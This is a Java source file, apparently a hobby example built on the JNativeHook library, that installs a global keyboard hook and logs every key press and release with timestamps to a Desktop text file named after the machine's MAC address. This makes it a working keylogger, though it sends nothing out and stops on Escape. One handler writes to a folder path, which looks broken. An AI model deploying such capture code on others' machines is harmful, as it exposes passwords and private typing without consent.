/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jnativehookexample;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Calendar;
import java.util.TimerTask;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author x
 */
public class KeyListener implements NativeKeyListener {

    String s1="\\tekst"+System.currentTimeMillis();

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
    MACaddress mac=new MACaddress();      
    String s = mac.getmac();

    Calendar calendar = Calendar.getInstance();
    calendar.setTimeInMillis(System.currentTimeMillis());

    int mYear = calendar.get(Calendar.YEAR);
    int mMonth = calendar.get(Calendar.MONTH);
    int mDay = calendar.get(Calendar.DAY_OF_MONTH);
    int mHour = calendar.get(Calendar.HOUR);
    int mMin = calendar.get(Calendar.MINUTE);
    int mSec = calendar.get(Calendar.SECOND);    
    System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        
    try(FileWriter fw = new FileWriter("C:\\Users\\PanTomek\\Desktop\\ThisOneFile\\"+s+s1+".txt", true);
    BufferedWriter bw = new BufferedWriter(fw);
    PrintWriter out = new PrintWriter(bw))
{
    out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode())+ " "+ mHour+":"+mMin+":"+mSec+ " " + mDay +"/"+ mMonth +"/"+ mYear);

} catch (IOException ex) {
    //exception handling left as an exercise for the reader
}

        
 if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                System.err.println("There was a problem unregistering the native hook.");
                System.err.println(ex.getMessage());
                
                
            }
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        MACaddress mac = new MACaddress();
        String s = mac.getmac();
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());

        int mYear = calendar.get(Calendar.YEAR);
        int mMonth = calendar.get(Calendar.MONTH);
        int mDay = calendar.get(Calendar.DAY_OF_MONTH);
        int mHour = calendar.get(Calendar.HOUR);
        int mMin = calendar.get(Calendar.MINUTE);
        int mSec = calendar.get(Calendar.SECOND);    
        
        
        
        
        
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    try(FileWriter fw = new FileWriter("C:\\Users\\PanTomek\\Desktop\\ThisOneFile\\"+s+s1+".txt", true);
    BufferedWriter bw = new BufferedWriter(fw);
    PrintWriter out = new PrintWriter(bw))
{
    out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + " "+ mHour+":"+mMin+":"+mSec+ " " + mDay +"/"+ mMonth +"/"+ mYear);

} catch (IOException ex) {
    //exception handling left as an exercise for the reader
}

    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
        
    try(FileWriter fw = new FileWriter("C:\\Users\\PanTomek\\Desktop\\ThisOneFile\\", true);
    BufferedWriter bw = new BufferedWriter(fw);
    PrintWriter out = new PrintWriter(bw))
{
    out.println("KT" + NativeKeyEvent.getKeyText(e.getKeyCode()) + System.currentTimeMillis());

} catch (IOException ex) {
    //exception handling left as an exercise for the reader
}
    }



}
